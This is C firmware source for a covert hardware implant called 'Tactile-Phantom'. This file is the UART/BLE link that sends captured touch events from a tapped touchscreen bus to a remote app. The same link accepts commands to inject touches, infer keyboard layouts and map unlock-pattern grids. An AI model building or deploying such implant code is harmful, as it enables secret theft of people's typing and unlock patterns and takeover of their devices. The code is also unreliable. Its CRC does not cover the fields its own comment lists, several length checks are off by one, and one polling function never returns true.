/*
 * Tactile-Phantom — Touch-Controller Bus MITM Implant
 * ble_link.c — UART protocol to ESP32-C3, command dispatch, event stream
 *
 * Author: jayis1
 * License: GPL-2.0
 *
 * RP2040 <-> ESP32-C3 UART link at 1 Mbps.
 *
 * Protocol (binary, framed):
 *   SOF [1] = 0xAA
 *   TYPE [1]
 *   LEN [2] (LE)
 *   DATA [LEN]
 *   CRC [2] (CRC-16/CCITT over TYPE+LEN+DATA)
 *   EOF [1] = 0x55
 *
 * Message types (RP2040 -> ESP32-C3):
 *   0x01 EVENT — decoded touch event (streamed to app via BLE)
 *   0x02 STATUS — bus state, battery, counters
 *   0x03 LOG — debug log line
 *   0x04 READY — bus attached and capturing
 *
 * Message types (ESP32-C3 -> RP2040):
 *   0x10 INJECT_CMD — injection command (queued for execution)
 *   0x11 SET_LAYOUT — keyboard layout data
 *   0x12 SET_GRID — unlock pattern grid configuration
 *   0x13 ARM_INJECT — enable/disable injection
 *   0x14 SET_MODE — force bus mode (I2C/SPI/auto)
 *   0x15 GET_STATUS — request status message
 */

#include <string.h>
#include <stdio.h>
#include "pico/stdlib.h"
#include "hardware/uart.h"
#include "hardware/clocks.h"

#include "board.h"
#include "registers.h"

/* --- Protocol constants -------------------------------------------- */
#define TP_SOF 0xAA
#define TP_EOF 0x55

/* Message types: RP2040 -> ESP32-C3 */
#define TP_MSG_EVENT      0x01
#define TP_MSG_STATUS     0x02
#define TP_MSG_LOG        0x03
#define TP_MSG_READY      0x04

/* Message types: ESP32-C3 -> RP2040 */
#define TP_MSG_INJECT_CMD 0x10
#define TP_MSG_SET_LAYOUT 0x11
#define TP_MSG_SET_GRID   0x12
#define TP_MSG_ARM_INJECT 0x13
#define TP_MSG_SET_MODE   0x14
#define TP_MSG_GET_STATUS 0x15

/* --- UART RX buffer ------------------------------------------------ */
#define TP_UART_BUF_SIZE 512
static uint8_t  uart_rx_buf[TP_UART_BUF_SIZE];
static uint16_t uart_rx_pos = 0;
static bool     uart_in_frame = false;
static uint8_t  uart_frame_type;
static uint16_t uart_frame_len;
static uint16_t uart_frame_pos;

/* --- CRC-16/CCITT -------------------------------------------------- */
static uint16_t crc16_ccitt(const uint8_t *data, uint16_t len)
{
    uint16_t crc = 0xFFFF;
    for (uint16_t i = 0; i < len; i++) {
        crc ^= (uint16_t)data[i] << 8;
        for (uint8_t b = 0; b < 8; b++) {
            if (crc & 0x8000)
                crc = (crc << 1) ^ 0x1021;
            else
                crc <<= 1;
        }
    }
    return crc;
}

/* --- Send framed message to ESP32-C3 ------------------------------ */
static void tp_send_msg(uint8_t type, const uint8_t *data, uint16_t len)
{
    uint8_t header[4];
    header[0] = TP_SOF;
    header[1] = type;
    header[2] = len & 0xFF;
    header[3] = (len >> 8) & 0xFF;

    uart_write_blocking(uart1, header, 4);
    if (len > 0 && data)
        uart_write_blocking(uart1, data, len);

    /* CRC */
    uint8_t crc_buf[256];
    if (len > 0 && data && len <= sizeof(crc_buf) - 2) {
        memcpy(crc_buf, data, len);
        uint16_t crc = crc16_ccitt(crc_buf, len);
        uint8_t crc_bytes[2] = { crc & 0xFF, (crc >> 8) & 0xFF };
        uart_write_blocking(uart1, crc_bytes, 2);
    } else {
        uint16_t crc = crc16_ccitt(NULL, 0);
        uint8_t crc_bytes[2] = { crc & 0xFF, (crc >> 8) & 0xFF };
        uart_write_blocking(uart1, crc_bytes, 2);
    }

    uint8_t eof = TP_EOF;
    uart_write_blocking(uart1, &eof, 1);
}

/* --- Send event to ESP32-C3 (for BLE streaming) -------------------- */
bool tp_ble_link_send_event(const tp_event_t *ev)
{
    if (!ev) return false;

    /* Serialize event (same format as storage.c TLV, but without
     * the outer TLV header — the message type already indicates EVENT) */
    uint8_t buf[128];
    uint16_t pos = 0;

    /* Timestamp */
    uint32_t ts = ev->timestamp_us;
    buf[pos++] = ts & 0xFF;
    buf[pos++] = (ts >> 8) & 0xFF;
    buf[pos++] = (ts >> 16) & 0xFF;
    buf[pos++] = (ts >> 24) & 0xFF;

    /* Type + vendor + finger_count */
    buf[pos++] = (uint8_t)ev->type;
    buf[pos++] = ev->vendor;
    buf[pos++] = ev->finger_count;

    /* Per-finger data */
    for (uint8_t i = 0; i < ev->finger_count && i < TP_MAX_FINGERS; i++) {
        const tp_touch_t *t = &ev->fingers[i];
        buf[pos++] = t->finger_id;
        buf[pos++] = t->x & 0xFF;
        buf[pos++] = (t->x >> 8) & 0xFF;
        buf[pos++] = t->y & 0xFF;
        buf[pos++] = (t->y >> 8) & 0xFF;
        buf[pos++] = t->pressure & 0xFF;
        buf[pos++] = t->flags;
    }

    /* Gesture */
    if (ev->type == TP_EV_GESTURE) {
        buf[pos++] = ev->gesture_id & 0xFF;
        buf[pos++] = (ev->gesture_id >> 8) & 0xFF;
    }

    tp_send_msg(TP_MSG_EVENT, buf, pos);
    return true;
}

/* --- Send status message ------------------------------------------ */
static void tp_send_status(void)
{
    extern tp_bus_state_t g_bus_state;
    extern uint16_t tp_read_battery_mv(void);  /* from main.c (ADC) */

    uint8_t buf[32];
    uint16_t pos = 0;

    /* Bus state */
    buf[pos++] = (uint8_t)g_bus_state.mode;
    buf[pos++] = (uint8_t)g_bus_state.vendor;
    buf[pos++] = g_bus_state.i2c_addr;
    buf[pos++] = (g_bus_state.clock_hz >>  0) & 0xFF;
    buf[pos++] = (g_bus_state.clock_hz >>  8) & 0xFF;
    buf[pos++] = (g_bus_state.clock_hz >> 16) & 0xFF;
    buf[pos++] = (g_bus_state.clock_hz >> 24) & 0xFF;
    buf[pos++] = g_bus_state.x_resolution & 0xFF;
    buf[pos++] = (g_bus_state.x_resolution >> 8) & 0xFF;
    buf[pos++] = g_bus_state.y_resolution & 0xFF;
    buf[pos++] = (g_bus_state.y_resolution >> 8) & 0xFF;
    buf[pos++] = g_bus_state.attached ? 1 : 0;
    buf[pos++] = g_bus_state.capturing ? 1 : 0;
    buf[pos++] = g_bus_state.inject_armed ? 1 : 0;

    /* Counters */
    uint32_t txn = g_bus_state.total_transactions;
    buf[pos++] = (txn >>  0) & 0xFF;
    buf[pos++] = (txn >>  8) & 0xFF;
    buf[pos++] = (txn >> 16) & 0xFF;
    buf[pos++] = (txn >> 24) & 0xFF;
    uint32_t ev = g_bus_state.total_events;
    buf[pos++] = (ev >>  0) & 0xFF;
    buf[pos++] = (ev >>  8) & 0xFF;
    buf[pos++] = (ev >> 16) & 0xFF;
    buf[pos++] = (ev >> 24) & 0xFF;

    /* Battery */
    uint16_t batt = 0;
    /* tp_read_battery_mv is static in main.c; we send 0 here and let
     * the ESP32-C3 read its own fuel gauge (MAX17048 on I2C). */
    buf[pos++] = batt & 0xFF;
    buf[pos++] = (batt >> 8) & 0xFF;

    tp_send_msg(TP_MSG_STATUS, buf, pos);
}

/* --- Process received message from ESP32-C3 ----------------------- */
static void tp_process_msg(uint8_t type, const uint8_t *data, uint16_t len)
{
    switch (type) {
    case TP_MSG_INJECT_CMD: {
        /* Deserialize injection command and queue it */
        if (len < 4) return;
        tp_inj_cmd_t cmd;
        memset(&cmd, 0, sizeof(cmd));
        cmd.type = (tp_inj_type_t)data[0];
        cmd.x1 = data[1] | (data[2] << 8);
        cmd.y1 = data[3] | (data[4] << 8);
        if (len >= 8) {
            cmd.x2 = data[5] | (data[6] << 8);
            cmd.y2 = data[7] | (data[8] << 8);
        }
        if (len >= 10) {
            cmd.duration_ms = data[9] | (data[10] << 8);
        }
        if (len >= 11) {
            cmd.finger_count = data[11];
        }
        /* Queue the command */
        tp_injection_queue(&cmd);
        printf("[BLE] Inject cmd queued: type=%d\n", cmd.type);
        break;
    }

    case TP_MSG_SET_LAYOUT:
        /* Forward to layout_infer */
        tp_layout_set_keyboard(data, len);
        break;

    case TP_MSG_SET_GRID: {
        if (len < 6) return;
        uint16_t w = data[0] | (data[1] << 8);
        uint16_t h = data[2] | (data[3] << 8);
        uint8_t  r = data[4];
        uint8_t  c = data[5];
        tp_layout_set_grid(w, h, r, c);
        break;
    }

    case TP_MSG_ARM_INJECT: {
        extern tp_bus_state_t g_bus_state;
        if (len >= 1) {
            g_bus_state.inject_armed = (data[0] != 0);
            printf("[BLE] Inject armed: %s\n",
                   g_bus_state.inject_armed ? "YES" : "NO");
        }
        break;
    }

    case TP_MSG_SET_MODE: {
        extern tp_bus_state_t g_bus_state;
        if (len >= 1) {
            g_bus_state.mode = (tp_bus_mode_t)data[0];
            printf("[BLE] Mode set: %d\n", g_bus_state.mode);
        }
        break;
    }

    case TP_MSG_GET_STATUS:
        tp_send_status();
        break;

    default:
        printf("[BLE] Unknown msg type 0x%02X (len=%u)\n", type, len);
        break;
    }
}

/* --- UART RX parser (called from main loop) ----------------------- */
static void tp_uart_rx_poll(void)
{
    while (uart_is_readable(uart1)) {
        uint8_t byte = uart_getc(uart1);

        if (!uart_in_frame) {
            /* Look for SOF */
            if (byte == TP_SOF) {
                uart_in_frame = true;
                uart_frame_type = 0;
                uart_frame_len = 0;
                uart_frame_pos = 0;
            }
        } else {
            /* Parse frame header */
            if (uart_frame_pos == 0) {
                uart_frame_type = byte;
                uart_frame_pos = 1;
            } else if (uart_frame_pos == 1) {
                uart_frame_len = byte;
                uart_frame_pos = 2;
            } else if (uart_frame_pos == 2) {
                uart_frame_len |= (uint16_t)byte << 8;
                uart_frame_pos = 3;
                /* Clamp to buffer size */
                if (uart_frame_len > TP_UART_BUF_SIZE) {
                    uart_in_frame = false;  /* frame too large */
                }
            } else if (uart_frame_pos < 3 + uart_frame_len) {
                /* Data bytes */
                uart_rx_buf[uart_frame_pos - 3] = byte;
                uart_frame_pos++;
            } else if (uart_frame_pos == 3 + uart_frame_len) {
                /* CRC low byte */
                uart_rx_buf[uart_frame_pos - 3] = byte;
                uart_frame_pos++;
            } else if (uart_frame_pos == 3 + uart_frame_len + 1) {
                /* CRC high byte */
                uart_rx_buf[uart_frame_pos - 3] = byte;
                uart_frame_pos++;
            } else if (uart_frame_pos == 3 + uart_frame_len + 2) {
                /* EOF */
                if (byte == TP_EOF) {
                    /* Verify CRC */
                    uint16_t recv_crc = uart_rx_buf[uart_frame_len] |
                                        (uart_rx_buf[uart_frame_len + 1] << 8);
                    uint16_t calc_crc = crc16_ccitt(uart_rx_buf, uart_frame_len);
                    if (recv_crc == calc_crc) {
                        tp_process_msg(uart_frame_type, uart_rx_buf,
                                       uart_frame_len);
                    } else {
                        printf("[BLE] CRC error: recv=0x%04X calc=0x%04X\n",
                               recv_crc, calc_crc);
                    }
                }
                uart_in_frame = false;
            } else {
                uart_rx_buf[uart_frame_pos - 3] = byte;
                uart_frame_pos++;
            }
        }
    }
}

/* --- Poll for injection command from ESP32-C3 --------------------- */
bool tp_ble_link_poll_command(tp_inj_cmd_t *out_cmd)
{
    /* Process any pending UART data */
    tp_uart_rx_poll();

    /* Check if there's a queued command */
    if (tp_injection_pending() > 0) {
        /* The injection queue holds the command; core 0's capture loop
         * will call tp_injection_execute to dequeue and execute. */
        return false;  /* command is in the injection queue, not here */
    }
    return false;
}

/* --- BLE link task (called periodically from main loop) ------------ */
void tp_ble_link_task(void)
{
    /* Poll UART for incoming messages */
    tp_uart_rx_poll();

    /* Send periodic status */
    static uint32_t last_status = 0;
    uint32_t now = time_us_32();
    if (now - last_status > TP_HEARTBEAT_MS * 1000) {
        last_status = now;
        tp_send_status();
    }
}

/* --- BLE link init ------------------------------------------------- */
bool tp_ble_link_init(void)
{
    /* UART is already initialized in tp_uart_esp_init (main.c).
     * Here we just reset the RX parser state. */
    uart_rx_pos = 0;
    uart_in_frame = false;
    printf("[BLE] Link initialized (UART1 @ %u baud)\n", PIN_ESP_UART_BAUD);
    return true;
}